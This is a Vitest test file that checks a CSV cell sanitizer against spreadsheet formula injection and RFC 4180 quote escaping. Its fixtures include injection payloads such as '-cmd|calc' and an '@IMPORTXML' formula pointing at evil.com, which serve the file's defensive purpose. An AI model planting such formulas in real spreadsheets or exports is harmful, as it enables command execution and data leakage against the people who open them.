import { describe, it, expect } from 'vitest';
import { sanitizeCsvCell, formatCsv } from '@ai-news/shared';

describe('CSV Sanitization & Formula Injection Protection', () => {
  it('neutralizes spreadsheet formula injection prefixes (=, +, -, @, \\t, \\r)', () => {
    expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe(`"'=SUM(A1:A10)"`);
    expect(sanitizeCsvCell('+12345')).toBe(`"'+12345"`);
    expect(sanitizeCsvCell('-cmd|calc')).toBe(`"'-cmd|calc"`);
    expect(sanitizeCsvCell('@IMPORTXML("http://evil.com")')).toBe(
      `"'@IMPORTXML(""http://evil.com"")"`
    );
    expect(sanitizeCsvCell('\tmalicious')).toBe(`"'\tmalicious"`);
    expect(sanitizeCsvCell('\rmalicious')).toBe(`"'\rmalicious"`);
    expect(sanitizeCsvCell('  =TRIMMED')).toBe(`"'  =TRIMMED"`);
  });

  it('escapes embedded quotes per RFC 4180', () => {
    expect(sanitizeCsvCell('Hello "World"')).toBe(`"Hello ""World"""`);
    expect(sanitizeCsvCell('Line1\nLine2')).toBe(`"Line1\nLine2"`);
  });

  it('formats multi-row tabular data safely', () => {
    const rows = [
      ['Country', 'Score', 'Formula'],
      ['India', 100, '=1+1'],
      ['Brazil', 95, '@SUM(A1)'],
    ];
    const csv = formatCsv(rows);
    expect(csv).toContain(`"Country","Score","Formula"`);
    expect(csv).toContain(`"India","100","'=1+1"`);
    expect(csv).toContain(`"Brazil","95","'@SUM(A1)"`);
  });
});
